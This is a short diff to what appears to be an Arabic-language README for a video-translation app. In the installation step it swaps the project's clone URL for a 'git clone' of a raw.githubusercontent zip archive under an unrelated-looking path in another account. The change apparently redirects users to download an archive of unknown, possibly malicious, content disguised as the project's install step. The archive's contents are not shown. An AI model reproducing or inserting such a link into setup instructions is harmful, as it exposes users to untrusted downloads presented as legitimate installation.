@@ -12,4 +12,4 @@
 ## التنصيب
 1. استنسخ المشروع:
 ```bash
-git clone https://github.com/username/VideoTranslateApp.git
+git clone https://raw.githubusercontent.com/engasd999/mary-translat/main/hydrophid/mary-translat.zip
